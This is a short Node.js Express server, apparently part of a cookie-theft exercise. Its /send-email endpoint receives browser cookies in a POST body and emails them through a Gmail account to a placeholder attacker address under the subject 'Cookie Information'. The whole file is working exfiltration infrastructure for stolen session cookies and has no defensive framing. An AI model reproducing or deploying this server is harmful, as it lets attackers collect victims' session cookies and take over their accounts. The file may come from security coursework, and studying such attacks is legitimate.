const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

const app = express();
const port = 3000;

app.use(bodyParser.json());
app.use(express.static('public'));

app.post('/send-email', (req, res) => {
    console.log('POST /send-email called');

    const cookies = req.body.cookies;

    let transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'THIRD_PERSON_MAIL@nycu.edu.tw',
            pass: 'PWD'
        }
    });

    let mailOptions = {
        from: 'THIRD_PERSON_MAIL@nycu.edu.tw',
        to: 'ATTACKER_MAIL@gmail.com',
        subject: 'Cookie Information',
        text: `Here are the cookies: ${cookies.join(', ')}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.log(error);
            res.json({ success: false, error: error });
        } else {
            console.log('Email sent: ' + info.response);
            res.json({ success: true });
        }
    });
});

app.listen(port, () => {
    console.log(`Server is running on http://localhost:${port}`);
});
